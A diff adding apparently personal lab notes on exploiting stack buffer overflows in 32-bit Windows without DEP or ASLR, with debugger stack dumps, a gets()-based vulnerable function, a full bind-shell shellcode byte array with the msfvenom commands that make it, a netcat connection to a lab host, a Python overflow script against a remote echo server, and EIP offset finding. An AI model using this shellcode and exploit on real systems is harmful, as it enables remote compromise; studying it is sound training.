@@ -1,0 +1,868 @@
+Exploit Research
+
+- Buffer Overflows (Stack Based)
+- In Absence of Protection Mechanism like DEP, ASLR etc.
+- 32-bit Windows
+
+
+Stack Basic
+
+- Tempolary Storage Area for a Program
+- Argument to Function , Return address, Local Variables
+	Etc.
+
+function1(int i 1){
+	char *local_var1_f1 = "Function 1";
+	int local_var2_f1 = 0x55667788;
+	return 1;
+
+}
+int main(int argc, char *argc[]){
+	char *local_var1 = "Main Function";
+	int local_var2 = 0xaabbccdd;
+
+	function1(0x11223344);
+
+	return 0;
+
+}
+
+Note: **The Stack Go from High to Low Memory Address
+
+**Call Fucntion is push the next address instruction into 
+	top of stack before Call a Fucntion
+
+
+0022FEC8  /0022FEF8  EBP (Frame Pointer)
+0022FECC  |00401565  Return Address in Main
+0022FED0  |11223344  Argument of Function1
+
+
+0022FEB8   00000000  ....
+0022FEBC   0040174F  O@.  RETURN to StackDem.0040174F from StackDem.00401680
+0022FEC0   55667788  local_var2_f1
+0022FEC4   00404000  local_var1_f1
+0022FEC8  /0022FEF8  EBP (Frame Pointer)
+0022FECC  |00401565  Return Address in Main
+0022FED0  |11223344  Argument of Function1
+
+Note: LEAVE instructin is restore the EBP (Frame Pointer)
+	Back
+
+
+ESP 0022FEB8 -- Before LEAVE
+EBP 0022FEC8 -- Before LEAVE
+
+ESP 0022FECC -- After LEAVE
+EBP 0022FEF8 -- After LEAVE
+
+0022FECC   00401565  e@.  RETURN to StackDem.00401565 from StackDem.00401520
+0022FED0   11223344  D3"
+
+
+AND THEN When hit the RETN instruction it's autometic
+	POP the ESP[value] to EIP for return address again
+
+
+
+ESP 0022FED0
+EBP 0022FEF8
+
+after leave
+
+ESP 0022FEFC
+EBP 0022FFC0
+
+Stack Winding and Unwinding 
+
+- Main -> F1 -> F2 -> F3 -> F4
+
+- Trace the stack change
+
+- Trace Winding and Unwinding
+
+
+
+function3(int i 1){
+	char *local_var1_f3 = "Function 3";
+	
+	return 3;
+
+function2(int i 1){
+	char *local_var1_f2 = "Function 2";
+	function3(0x33333333);
+	return 2;
+
+
+function1(int i 1){
+	char *local_var1_f1 = "Function 1";
+	function2(0x22222222);
+	return 1;
+
+}
+int main(int argc, char *argc[]){
+	char *local_var1 = "Main Function";
+	int local_var2 = 0xaabbccdd;
+
+	function1(0x11111111);
+
+	return 0;
+
+}
+
+
+0022FEC8  /0022FEF8  EBP (Frame Pointer)
+0022FECC  |00401596  Return Address to main
+0022FED0  |11111111  argument of function1
+---------------------------------------------------
+
+0022FEAC  /0022FEC8  EBP (Frame Pointer)
+0022FEB0  |0040156D  Return Address to function1
+0022FEB4  |22222222  argument of function2
+0022FEB8  |00000000  ....
+0022FEBC  |0040177F  @.  RETURN to StackDem.0040177F from StackDem.004016B0
+0022FEC0  |00401F40  @@.  StackDem.00401F40
+0022FEC4  |00404016  local_var1_f1 = "Function 1"
+0022FEC8  /0022FEF8  EBP (Frame Pointer)
+0022FECC  |00401596  Return Address to main
+0022FED0  |11111111  argument of function1
+---------------------------------------------------
+
+0022FE90  /0022FEAC  EBP (Frame Pointer) for function2
+0022FE94  |0040154D  Return Address to function2
+0022FE98  |33333333  argument of function3
+0022FE9C  |7C9101BB  »‘|  RETURN to ntdll.7C9101BB from ntdll.7C90E8E6
+0022FEA0  |77C2C3C9  ÉÃÂw  RETURN to msvcrt.77C2C3C9 from ntdll.RtlAllocateHeap
+0022FEA4  |003E0000  ..>.
+0022FEA8  |0040400B  local_var1_f2 = "Function 2"
+0022FEAC  /0022FEC8  EBP (Frame Pointer) for function1
+0022FEB0  |0040156D  Return Address to function1
+0022FEB4  |22222222  argument of function2
+0022FEB8  |00000000  ....
+0022FEBC  |0040177F  @.  RETURN to StackDem.0040177F from StackDem.004016B0
+0022FEC0  |00401F40  @@.  StackDem.00401F40
+0022FEC4  |00404016  local_var1_f1 = "Function 1"
+0022FEC8  /0022FEF8  EBP (Frame Pointer)  for main
+0022FECC  |00401596  Return Address to main
+0022FED0  |11111111  argument of function1
+------------------------------------------------------
+Final State
+0022FE80   77C12850  
+0022FE84   FFFFFFFF  
+0022FE88   77C34E29  
+0022FE8C   00404000  local_var1_f1 = "Function 3"
+0022FE90  /0022FEAC  EBP (Frame Pointer) for function2
+0022FE94  |0040154D  Return Address to function2
+0022FE98  |33333333  argument of function3
+0022FE9C  |7C9101BB  
+0022FEA0  |77C2C3C9  
+0022FEA4  |003E0000  
+0022FEA8  |0040400B  local_var1_f2 = "Function 2"
+0022FEAC  /0022FEC8  EBP (Frame Pointer) for function1
+0022FEB0  |0040156D  Return Address to function1
+0022FEB4  |22222222  argument of function2
+0022FEB8  |00000000  
+0022FEBC  |0040177F  
+0022FEC0  |00401F40 
+0022FEC4  |00404016  local_var1_f1 = "Function 1"
+0022FEC8  /0022FEF8  EBP (Frame Pointer)  for main
+0022FECC  |00401596  Return Address to main
+0022FED0  |11111111  argument of function1
+-------------------------------------------------------
+
+
+Tampering Return Address
+
+Note: **The Stack Go from High to Low Memory Address
+
+
+ShouldNotExecute(){
+
+	char *message = "Shold Not Execute"l;
+	printf(message)
+	return 0;
+
+}
+function1(int i 1){
+	char *local_var1_f1 = "Function 1";
+	int local_var2_f1 = 0x55667788;
+	return 1;
+
+}
+int main(int argc, char *argc[]){
+	char *local_var1 = "Main Function";
+	int local_var2 = 0xaabbccdd;
+
+	function1(0x11223344);
+
+	return 0;
+
+}
+
+00401520  /. 55             PUSH EBP
+
+7C81CAFA
+
+Return Address To Shellcode
+
+
+
+
+
+Unsigned Char ShouldNotExecute[] =
+
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
+"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
+"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
+"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
+"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
+"\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
+"\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
+"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
+"\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"
+"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb"
+"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
+
+
+
+
+
+function1(int i 1){
+	char *local_var1_f1 = "Function 1";
+	int local_var2_f1 = 0x55667788;
+	return 1;
+
+}
+int main(int argc, char *argc[]){
+	char *local_var1 = "Main Function";
+	int local_var2 = 0xaabbccdd;
+
+	function1(0x11223344);
+
+	return 0;
+
+}
+
+
+Note: ** msfvenom -p windows/shell_bind_tcp -f c [for shellcode in hex]
+      ** msfvenom -p windows/shell_bind_tcp -f raw | ndisasm -u - 
+		[for shellcode in Assembly]**
+
+
+the begining address of shellcode -> 00403020
+
+
+nc 192.168.179.131 4444
+
+
+---------------------------------------
+ 
+Overwriting the Stack
+
+
+function1(int i 1){
+	char *local_var1_f1 = "Function 1";
+	int local_var2_f1 = 0x55667788;
+	
+	char buffer[10];
+	gets(buffer);
+	printf(buffer);
+	return 1;
+
+}
+int main(int argc, char *argc[]){
+	char *local_var1 = "Main Function";
+	int local_var2 = 0xaabbccdd;
+
+	function1(0x11223344);
+
+	return 0;
+
+}
+
+-----------------------------------------------
+0022FE90   0022FEAE  ®þ".  \s = 0022FEAE
+0022FE94   7C9101C0  À‘|  ntdll.7C9101C0
+0022FE98   FFFFFFFF  ÿÿÿÿ
+0022FE9C   7C9101BB  »‘|  RETURN to ntdll.7C9101BB from ntdll.7C90E8E6
+0022FEA0   77C2C3C9  ÉÃÂw  RETURN to msvcrt.77C2C3C9 from ntdll.RtlAllocateHeap
+0022FEA4   003E0000  ..>.
+0022FEA8   FFFFFFFF  ÿÿÿÿ
+0022FEAC   77C2C3CE  ÎÃÂw  RETURN to msvcrt.77C2C3CE from msvcrt.77C3745B
+0022FEB0   0000004E  N...
+0022FEB4   003E2470  p$>.
+0022FEB8   55667788  ˆwfU
+0022FEBC   00404000  .@@.  ASCII "Function 1"
+0022FEC0   00401F30  0@.  Overwrit.00401F30
+0022FEC4   0022FEB0  °þ".
+0022FEC8  /0022FEF8  øþ".
+0022FECC  |0040157B  {@.  RETURN to Overwrit.0040157B from Overwrit.00401520
+
+
+0022FE90   0022FEAE  ®þ".  ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0022FE94   7C9101C0  À‘|  ntdll.7C9101C0
+0022FE98   FFFFFFFF  ÿÿÿÿ
+0022FE9C   7C9101BB  »‘|  RETURN to ntdll.7C9101BB from ntdll.7C90E8E6
+0022FEA0   77C2C3C9  ÉÃÂw  RETURN to msvcrt.77C2C3C9 from ntdll.RtlAllocateHeap
+0022FEA4   003E0000  ..>.
+0022FEA8   FFFFFFFF  ÿÿÿÿ
+0022FEAC   4141C3CE  ÎÃAA
+0022FEB0   41414141  AAAA
+0022FEB4   41414141  AAAA
+0022FEB8   41414141  AAAA
+0022FEBC   41414141  AAAA
+0022FEC0   41414141  AAAA
+0022FEC4   41414141  AAAA
+0022FEC8   41414141  AAAA
+0022FECC   41414141  AAAA -----------
+
+
+
+0022FE90   0022FEAE  ®þ".  ASCII "A123456789B123456789C123456789D123456789"
+0022FE94   7C9101C0  À‘|  ntdll.7C9101C0
+0022FE98   FFFFFFFF  ÿÿÿÿ
+0022FE9C   7C9101BB  »‘|  RETURN to ntdll.7C9101BB from ntdll.7C90E8E6
+0022FEA0   77C2C3C9  ÉÃÂw  RETURN to msvcrt.77C2C3C9 from ntdll.RtlAllocateHeap
+0022FEA4   003E0000  ..>.
+0022FEA8   FFFFFFFF  ÿÿÿÿ
+0022FEAC   3141C3CE  ÎÃA1
+0022FEB0   35343332  2345
+0022FEB4   39383736  6789
+0022FEB8   33323142  B123
+0022FEBC   37363534  4567
+0022FEC0   31433938  89C1
+0022FEC4   35343332  2345
+0022FEC8   39383736  6789
+0022FECC   33323144  D123-----------------D123
+
+Stack address=0022FEAE, (ASCII "A123456789B123456789C123456789D123456789")
+EAX=0022FEAE, (ASCII "A123456789B123456789C123456789D123456789")
+
+
+We can change D123 to return address
+
+
+
+
+----------------------------------------------------------
+
+Overwriting the Stack Remotely
+
+
+
+0022F72C   0040176F  o@.  RETURN to Echo-Ser.0040176F from Echo-Ser.00401520
+0022F730   0022F740  Point to AAAAAA
+0022F734   000005DC  Ü..
+0022F738   000005DC  Ü..
+0022F73C   00000000  ....
+
+
+
+./exploit.py
+
+#!/usr/bin/python
+
+import socket
+import sys
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+sock.connect((sys.argv[1], 9000))
+
+buffer = "A"*2000
+
+sock.send(buffer)
+
+sock.close()
+
+---------------------------------------------------------------------
+
+Calculating the Location of RET Overwrite.
+
+- Find the position
+	- Using pattern for verify the value of byte for overwrite
+		return address
+
+Note: script for create pattern 
+root@THEnterprise:/usr/share/metasploit-framework/tools# ./pattern_create.rb 2000
+
+
+
+69423569 <-- EIP
+37694236 <-- ESP  
+
+0022F72C  |0040176F  o@.  RETURN to Echo-Ser.0040176F from Echo-Ser.00401520
+
+-----------------------------------------------------------------------
+RET Control Code Execution
+
+0022F730   reverse > 30F72200 (\x30\xF7\x22\x00)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
